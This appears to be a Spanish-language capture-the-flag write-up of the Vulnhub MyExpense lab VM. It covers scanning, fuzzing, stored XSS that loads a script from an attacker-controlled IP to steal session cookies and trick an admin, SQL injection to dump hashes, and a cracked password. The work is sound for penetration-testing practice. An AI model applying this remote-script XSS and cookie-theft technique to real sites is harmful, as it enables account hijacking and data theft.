---
tags:
  - WriteUp
---
---
***Vulnhub - MyExpense***: https://www.vulnhub.com/entry/myexpense-1,405/

![[Pasted image 20250113195054.png]]

![[Pasted image 20250113200525.png]]

`nmap -p80,40375,40749,47297,56569 -sCV 192.168.2.106 -oN targeted`

Luego del escaneo nos creamos una cuenta en la web que tienen la VM

En este punto haremos un escaneo de directorios a ver si encontramos algo
![[Pasted image 20250113202134.png]]

De manera que podemos ver un directorio admin y mediante wapalyzer sabemos que dentro de ese directorio se usa php por lo que haremos fuzzing en ese directorio buscando archivos php ![[Pasted image 20250113203043.png]]
vemos que existe un archivo admin.php
![[Pasted image 20250113203126.png]]

Aca veremos de crear una cuenta y ver de ejecutar un XSS pero al crear un cuenta nos dice que esta inhabilitado, pero al ser una pagina de puro html podemos desabilitar el bloqueo de ese boton
![[Pasted image 20250113203714.png]]

Y como vemos se acontese la vulnerabilidad 
![[Pasted image 20250113203834.png]]

Ahora debido a esto crearemos un script en javascript y mediante el XSS haremos una petición a nuestro pc para ejecutar el script (recordar montar con python el http), lo que sucede es que al intentar robar la cookie del administrador que vimos que esta por el servidor este esta conectado al mismo por lo que no podemos usarla lo que podemos hacer que redirigir al administrador para que habilite sin intención nuestro usuario ya que al intentar activarlo nos dice que solo puede hacerlo un admin

El archivo javascript sera el siguiente y básicamente debe hacer la labor de redirigir al administrador
![[Pasted image 20250113211233.png]]

Cuando ejecute el servidor nuestro script ya podremos autenticarnos con el usuario con el que teniamos credenciales
![[Pasted image 20250113211749.png]]

por lo tanto ahora podemos enviar la peticion pero esta solo sera envida, como vemos en nuestra cuenta tenemos un manager que debe aceptarla
![[Pasted image 20250113211945.png]]

Por lo que en la pagina de inicio donde se pueden mandar mensajes robaremos las cookies de sesión mediante un XSS de los usuarios normales y veremos si llegamos a obtener el de nuestro manager

antes de esto metemos el XSS para que lea el .js `<script src="http://192.168.2.110:4646/pwned.js"></script>`

![[Pasted image 20250113213629.png]]

luego mediante un injeccion sql desde el usuario de donde capturamos la cookie y obtendremos nombres de los usuarios con sus respectivas contraseñas, pero las obtendremos hasheadas por lo que las debemos crackear en este caso con hashes.com
![[Pasted image 20250113221636.png]]
La consetaseña de pbaudouin es HackMe finalmente. Por lo que ya podemos aceptarnos el pago